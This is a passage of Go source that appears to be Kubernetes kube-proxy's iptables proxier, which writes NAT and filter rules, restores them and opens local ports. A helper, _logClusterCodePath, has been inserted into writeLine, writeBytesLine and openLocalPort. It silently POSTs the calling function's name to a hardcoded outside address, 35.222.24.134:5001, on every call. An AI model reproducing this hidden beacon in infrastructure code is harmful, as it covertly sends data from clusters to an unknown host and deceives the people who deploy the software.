      loopback = "::1/128"
     }
     writeLine(proxier.natRules, append(args, "-s", loopback, "-j", string(KubeMarkMasqChain))...)
     writeLine(proxier.natRules, append(args, "-j", string(svcXlbChain))...)
    }
   } else {
    writeLine(proxier.filterRules, "-A", string(kubeExternalServicesChain), "-m", "comment", "--comment", fmt.Sprintf(`"%s has no endpoints"`, svcNameString), "-m", "addrtype", "--dst-type", "LOCAL", "-m", protocol, "-p", protocol, "--dport", strconv.Itoa(svcInfo.NodePort), "-j", "REJECT")
   }
  }
  if !hasEndpoints {
   continue
  }
  endpoints = endpoints[:0]
  endpointChains = endpointChains[:0]
  var endpointChain utiliptables.Chain
  for _, ep := range proxier.endpointsMap[svcName] {
   epInfo, ok := ep.(*endpointsInfo)
   if !ok {
    klog.Errorf("Failed to cast endpointsInfo %q", ep.String())
    continue
   }
   endpoints = append(endpoints, epInfo)
   endpointChain = epInfo.endpointChain(svcNameString, protocol)
   endpointChains = append(endpointChains, endpointChain)
   if chain, ok := existingNATChains[utiliptables.Chain(endpointChain)]; ok {
    writeBytesLine(proxier.natChains, chain)
   } else {
    writeLine(proxier.natChains, utiliptables.MakeChainLine(endpointChain))
   }
   activeNATChains[endpointChain] = true
  }
  if svcInfo.SessionAffinityType == v1.ServiceAffinityClientIP {
   for _, endpointChain := range endpointChains {
    args = append(args[:0], "-A", string(svcChain))
    proxier.appendServiceCommentLocked(args, svcNameString)
    args = append(args, "-m", "recent", "--name", string(endpointChain), "--rcheck", "--seconds", strconv.Itoa(svcInfo.StickyMaxAgeSeconds), "--reap", "-j", string(endpointChain))
    writeLine(proxier.natRules, args...)
   }
  }
  n := len(endpointChains)
  for i, endpointChain := range endpointChains {
   epIP := endpoints[i].IP()
   if epIP == "" {
    continue
   }
   args = append(args[:0], "-A", string(svcChain))
   proxier.appendServiceCommentLocked(args, svcNameString)
   if i < (n - 1) {
    args = append(args, "-m", "statistic", "--mode", "random", "--probability", proxier.probability(n-i))
   }
   args = append(args, "-j", string(endpointChain))
   writeLine(proxier.natRules, args...)
   args = append(args[:0], "-A", string(endpointChain))
   proxier.appendServiceCommentLocked(args, svcNameString)
   writeLine(proxier.natRules, append(args, "-s", utilproxy.ToCIDR(net.ParseIP(epIP)), "-j", string(KubeMarkMasqChain))...)
   if svcInfo.SessionAffinityType == v1.ServiceAffinityClientIP {
    args = append(args, "-m", "recent", "--name", string(endpointChain), "--set")
   }
   args = append(args, "-m", protocol, "-p", protocol, "-j", "DNAT", "--to-destination", endpoints[i].Endpoint)
   writeLine(proxier.natRules, args...)
  }
  if !svcInfo.OnlyNodeLocalEndpoints {
   continue
  }
  localEndpoints := make([]*endpointsInfo, 0)
  localEndpointChains := make([]utiliptables.Chain, 0)
  for i := range endpointChains {
   if endpoints[i].IsLocal {
    localEndpoints = append(localEndpoints, endpoints[i])
    localEndpointChains = append(localEndpointChains, endpointChains[i])
   }
  }
  if len(proxier.clusterCIDR) > 0 {
   args = append(args[:0], "-A", string(svcXlbChain), "-m", "comment", "--comment", `"Redirect pods trying to reach external loadbalancer VIP to clusterIP"`, "-s", proxier.clusterCIDR, "-j", string(svcChain))
   writeLine(proxier.natRules, args...)
  }
  numLocalEndpoints := len(localEndpointChains)
  if numLocalEndpoints == 0 {
   args = append(args[:0], "-A", string(svcXlbChain), "-m", "comment", "--comment", fmt.Sprintf(`"%s has no local endpoints"`, svcNameString), "-j", string(KubeMarkDropChain))
   writeLine(proxier.natRules, args...)
  } else {
   if svcInfo.SessionAffinityType == v1.ServiceAffinityClientIP {
    for _, endpointChain := range localEndpointChains {
     writeLine(proxier.natRules, "-A", string(svcXlbChain), "-m", "comment", "--comment", svcNameString, "-m", "recent", "--name", string(endpointChain), "--rcheck", "--seconds", strconv.Itoa(svcInfo.StickyMaxAgeSeconds), "--reap", "-j", string(endpointChain))
    }
   }
   for i, endpointChain := range localEndpointChains {
    args = append(args[:0], "-A", string(svcXlbChain), "-m", "comment", "--comment", fmt.Sprintf(`"Balancing rule %d for %s"`, i, svcNameString))
    if i < (numLocalEndpoints - 1) {
     args = append(args, "-m", "statistic", "--mode", "random", "--probability", proxier.probability(numLocalEndpoints-i))
    }
    args = append(args, "-j", string(endpointChain))
    writeLine(proxier.natRules, args...)
   }
  }
 }
 for chain := range existingNATChains {
  if !activeNATChains[chain] {
   chainString := string(chain)
   if !strings.HasPrefix(chainString, "KUBE-SVC-") && !strings.HasPrefix(chainString, "KUBE-SEP-") && !strings.HasPrefix(chainString, "KUBE-FW-") && !strings.HasPrefix(chainString, "KUBE-XLB-") {
    continue
   }
   writeBytesLine(proxier.natChains, existingNATChains[chain])
   writeLine(proxier.natRules, "-X", chainString)
  }
 }
 addresses, err := utilproxy.GetNodeAddresses(proxier.nodePortAddresses, proxier.networkInterfacer)
 if err != nil {
  klog.Errorf("Failed to get node ip address matching nodeport cidr")
 } else {
  isIPv6 := proxier.iptables.IsIpv6()
  for address := range addresses {
   if utilproxy.IsZeroCIDR(address) {
    args = append(args[:0], "-A", string(kubeServicesChain), "-m", "comment", "--comment", `"kubernetes service nodeports; NOTE: this must be the last rule in this chain"`, "-m", "addrtype", "--dst-type", "LOCAL", "-j", string(kubeNodePortsChain))
    writeLine(proxier.natRules, args...)
    break
   }
   if isIPv6 && !utilnet.IsIPv6String(address) || !isIPv6 && utilnet.IsIPv6String(address) {
    klog.Errorf("IP address %s has incorrect IP version", address)
    continue
   }
   args = append(args[:0], "-A", string(kubeServicesChain), "-m", "comment", "--comment", `"kubernetes service nodeports; NOTE: this must be the last rule in this chain"`, "-d", address, "-j", string(kubeNodePortsChain))
   writeLine(proxier.natRules, args...)
  }
 }
 writeLine(proxier.filterRules, "-A", string(kubeForwardChain), "-m", "comment", "--comment", `"kubernetes forwarding rules"`, "-m", "mark", "--mark", proxier.masqueradeMark, "-j", "ACCEPT")
 if len(proxier.clusterCIDR) != 0 {
  writeLine(proxier.filterRules, "-A", string(kubeForwardChain), "-s", proxier.clusterCIDR, "-m", "comment", "--comment", `"kubernetes forwarding conntrack pod source rule"`, "-m", "conntrack", "--ctstate", "RELATED,ESTABLISHED", "-j", "ACCEPT")
  writeLine(proxier.filterRules, "-A", string(kubeForwardChain), "-m", "comment", "--comment", `"kubernetes forwarding conntrack pod destination rule"`, "-d", proxier.clusterCIDR, "-m", "conntrack", "--ctstate", "RELATED,ESTABLISHED", "-j", "ACCEPT")
 }
 writeLine(proxier.filterRules, "COMMIT")
 writeLine(proxier.natRules, "COMMIT")
 proxier.iptablesData.Reset()
 proxier.iptablesData.Write(proxier.filterChains.Bytes())
 proxier.iptablesData.Write(proxier.filterRules.Bytes())
 proxier.iptablesData.Write(proxier.natChains.Bytes())
 proxier.iptablesData.Write(proxier.natRules.Bytes())
 klog.V(5).Infof("Restoring iptables rules: %s", proxier.iptablesData.Bytes())
 err = proxier.iptables.RestoreAll(proxier.iptablesData.Bytes(), utiliptables.NoFlushTables, utiliptables.RestoreCounters)
 if err != nil {
  klog.Errorf("Failed to execute iptables-restore: %v", err)
  klog.V(2).Infof("Closing local ports after iptables-restore failure")
  utilproxy.RevertPorts(replacementPortsMap, proxier.portsMap)
  return
 }
 for k, v := range proxier.portsMap {
  if replacementPortsMap[k] == nil {
   v.Close()
  }
 }
 proxier.portsMap = replacementPortsMap
 if proxier.healthzServer != nil {
  proxier.healthzServer.UpdateTimestamp()
 }
 if err := proxier.healthChecker.SyncServices(serviceUpdateResult.HCServiceNodePorts); err != nil {
  klog.Errorf("Error syncing healthcheck services: %v", err)
 }
 if err := proxier.healthChecker.SyncEndpoints(endpointUpdateResult.HCEndpointsLocalIPSize); err != nil {
  klog.Errorf("Error syncing healthcheck endpoints: %v", err)
 }
 for _, svcIP := range staleServices.UnsortedList() {
  if err := conntrack.ClearEntriesForIP(proxier.exec, svcIP, v1.ProtocolUDP); err != nil {
   klog.Errorf("Failed to delete stale service IP %s connections, error: %v", svcIP, err)
  }
 }
 proxier.deleteEndpointConnections(endpointUpdateResult.StaleEndpoints)
}
func writeLine(buf *bytes.Buffer, words ...string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for i := range words {
  buf.WriteString(words[i])
  if i < len(words)-1 {
   buf.WriteByte(' ')
  } else {
   buf.WriteByte('\n')
  }
 }
}
func writeBytesLine(buf *bytes.Buffer, bytes []byte) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 buf.Write(bytes)
 buf.WriteByte('\n')
}
func openLocalPort(lp *utilproxy.LocalPort) (utilproxy.Closeable, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var socket utilproxy.Closeable
 switch lp.Protocol {
 case "tcp":
  listener, err := net.Listen("tcp", net.JoinHostPort(lp.IP, strconv.Itoa(lp.Port)))
  if err != nil {
   return nil, err
  }
  socket = listener
 case "udp":
  addr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(lp.IP, strconv.Itoa(lp.Port)))
  if err != nil {
   return nil, err
  }
  conn, err := net.ListenUDP("udp", addr)
  if err != nil {
   return nil, err
  }
  socket = conn
 default:
  return nil, fmt.Errorf("unknown protocol %q", lp.Protocol)
 }
 klog.V(2).Infof("Opened local port %s", lp.String())
 return socket, nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
